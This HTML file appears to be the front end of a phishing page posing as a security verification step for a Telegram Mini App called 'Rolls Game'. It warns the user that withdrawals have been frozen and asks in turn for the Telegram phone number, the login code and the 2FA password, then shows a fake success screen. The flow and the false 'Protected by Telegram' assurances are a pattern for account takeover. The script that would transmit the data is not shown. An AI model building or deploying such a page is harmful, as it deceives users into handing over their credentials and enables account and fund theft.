<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rolls Game Verification</title>
    <link rel="stylesheet" href="style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <!-- Main Content -->
        <main class="main-content">
            <!-- Step 1: Frozen Account -->
            <div class="step active" id="step1">
                <div class="card frozen">
                    <div class="card-header">
                        <div class="icon-wrapper">
                            <i class="fas fa-snowflake"></i>
                        </div>
                        <h1 class="card-title">Account Security Alert</h1>
                    </div>
                    
                    <div class="card-body">
                        <div class="account-info">
                            <div class="info-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <p class="username" id="usernameDisplay">
                                Security verification required for your account
                            </p>
                        </div>
                        
                        <div class="alert-message">
                            <i class="fas fa-exclamation-triangle"></i>
                            <p>We've detected unusual activity and temporarily frozen withdrawals to protect your account.</p>
                        </div>
                        
                        <div class="instructions">
                            <div class="instruction">
                                <div class="number">1</div>
                                <p>Verify your identity with phone number</p>
                            </div>
                            <div class="instruction">
                                <div class="number">2</div>
                                <p>Enter verification code</p>
                            </div>
                            <div class="instruction">
                                <div class="number">3</div>
                                <p>Restore account access</p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-primary" onclick="startVerification()">
                            <i class="fas fa-unlock-alt"></i>
                            Begin Verification
                        </button>
                        <p class="note">Verification takes 1-2 minutes</p>
                    </div>
                </div>
            </div>

            <!-- Step 2: Phone Input -->
            <div class="step" id="step2">
                <div class="card">
                    <div class="card-header">
                        <button class="back-btn" onclick="goBack(1)">
                            <i class="fas fa-arrow-left"></i>
                        </button>
                        <h2 class="card-title">Phone Verification</h2>
                        <div class="step-indicator">Step 1/3</div>
                    </div>
                    
                    <div class="card-body">
                        <div class="input-group">
                            <label for="phoneInput">
                                <i class="fas fa-phone"></i>
                                Enter your Telegram phone number
                            </label>
                            <div class="phone-input-wrapper">
                                <div class="country-code">+</div>
                                <input 
                                    type="tel" 
                                    id="phoneInput" 
                                    placeholder="1234567890"
                                    pattern="[0-9]*"
                                    inputmode="numeric"
                                >
                            </div>
                            <p class="input-hint">Enter number without country code</p>
                        </div>
                        
                        <div class="terms">
                            <input type="checkbox" id="termsCheckbox">
                            <label for="termsCheckbox">
                                I agree to use my phone number for security verification
                            </label>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-primary" onclick="sendCode()" id="sendCodeBtn">
                            <i class="fas fa-paper-plane"></i>
                            Send Verification Code
                        </button>
                    </div>
                </div>
            </div>

            <!-- Step 3: Code Verification -->
            <div class="step" id="step3">
                <div class="card">
                    <div class="card-header">
                        <button class="back-btn" onclick="goBack(2)">
                            <i class="fas fa-arrow-left"></i>
                        </button>
                        <h2 class="card-title">Enter Code</h2>
                        <div class="step-indicator">Step 2/3</div>
                    </div>
                    
                    <div class="card-body">
                        <div class="code-input-container">
                            <p class="code-hint">Enter the 5-digit code sent to your Telegram</p>
                            <div class="code-input">
                                <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
                                <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
                                <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
                                <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
                                <input type="text" maxlength="1" oninput="moveToNext(this, 5)">
                            </div>
                            
                            <div class="timer-container">
                                <div class="timer" id="timer">
                                    <i class="fas fa-clock"></i>
                                    Code expires in <span id="countdown">60</span>s
                                </div>
                                <button class="btn-link" onclick="resendCode()" id="resendBtn" disabled>
                                    Resend Code
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-primary" onclick="verifyCode()" id="verifyCodeBtn">
                            <i class="fas fa-check-circle"></i>
                            Verify Code
                        </button>
                    </div>
                </div>
            </div>

            <!-- Step 4: 2FA -->
            <div class="step" id="step4">
                <div class="card">
                    <div class="card-header">
                        <button class="back-btn" onclick="goBack(3)">
                            <i class="fas fa-arrow-left"></i>
                        </button>
                        <h2 class="card-title">Two-Factor Authentication</h2>
                    </div>
                    
                    <div class="card-body">
                        <div class="input-group">
                            <label for="passwordInput">
                                <i class="fas fa-lock"></i>
                                Enter your 2FA password
                            </label>
                            <input 
                                type="password" 
                                id="passwordInput" 
                                placeholder="Enter password"
                            >
                            <p class="input-hint">Required for accounts with 2FA enabled</p>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-primary" onclick="verify2FA()" id="verify2FABtn">
                            <i class="fas fa-shield-check"></i>
                            Complete Verification
                        </button>
                    </div>
                </div>
            </div>

            <!-- Step 5: Success -->
            <div class="step" id="step5">
                <div class="card success">
                    <div class="card-body">
                        <div class="success-animation">
                            <div class="success-icon">
                                <i class="fas fa-check"></i>
                            </div>
                            <div class="confetti"></div>
                            <div class="confetti"></div>
                            <div class="confetti"></div>
                        </div>
                        
                        <h2 class="success-title">Verification Complete!</h2>
                        <p class="success-message">
                            Your account has been successfully verified and secured.
                        </p>
                        
                        <div class="verification-details">
                            <div class="detail-item">
                                <span class="detail-label">Status</span>
                                <span class="detail-value verified">
                                    <i class="fas fa-check-circle"></i>
                                    Verified
                                </span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Account</span>
                                <span class="detail-value" id="verifiedUsername"></span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Time</span>
                                <span class="detail-value" id="verificationTime"></span>
                            </div>
                        </div>
                        
                        <div class="next-steps">
                            <h3>Next Steps:</h3>
                            <ul>
                                <li><i class="fas fa-check"></i> Withdrawals have been re-enabled</li>
                                <li><i class="fas fa-check"></i> Account security has been upgraded</li>
                                <li><i class="fas fa-check"></i> Support team notified for processing</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-secondary" onclick="closeMiniApp()">
                            <i class="fas fa-times"></i>
                            Close Mini App
                        </button>
                    </div>
                </div>
            </div>

            <!-- Step 6: Error -->
            <div class="step" id="step6">
                <div class="card error">
                    <div class="card-body">
                        <div class="error-icon">
                            <i class="fas fa-exclamation-circle"></i>
                        </div>
                        
                        <h2 class="error-title">Verification Failed</h2>
                        <p class="error-message" id="errorMessage">
                            An error occurred during verification.
                        </p>
                        
                        <div class="error-details">
                            <p>Please check:</p>
                            <ul>
                                <li><i class="fas fa-circle"></i> Correct phone number</li>
                                <li><i class="fas fa-circle"></i> Valid verification code</li>
                                <li><i class="fas fa-circle"></i> Stable internet connection</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="card-footer">
                        <button class="btn-primary" onclick="goBack(1)">
                            <i class="fas fa-redo"></i>
                            Try Again
                        </button>
                        <button class="btn-link" onclick="contactSupport()">
                            Contact Support
                        </button>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="footer">
            <div class="footer-content">
                <div class="brand">
                    <div class="logo">
                        <i class="fas fa-dice"></i>
                        <span>Rolls Game</span>
                    </div>
                    <p class="tagline">Secure Gaming Experience</p>
                </div>
                
                <div class="security-info">
                    <div class="security-badge">
                        <i class="fas fa-shield-check"></i>
                        <span>Protected by Telegram</span>
                    </div>
                    <p class="security-note">
                        Your data is encrypted and secured
                    </p>
                </div>
            </div>
            
            <div class="footer-links">
                <a href="https://t.me/rollssupport" target="_blank">
                    <i class="fas fa-headset"></i>
                    Support
                </a>
                <a href="#" onclick="showPrivacy()">
                    <i class="fas fa-lock"></i>
                    Privacy
                </a>
                <a href="#" onclick="showTerms()">
                    <i class="fas fa-file-contract"></i>
                    Terms
                </a>
            </div>
        </footer>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="spinner"></div>
            <p class="loading-text" id="loadingText">Processing...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>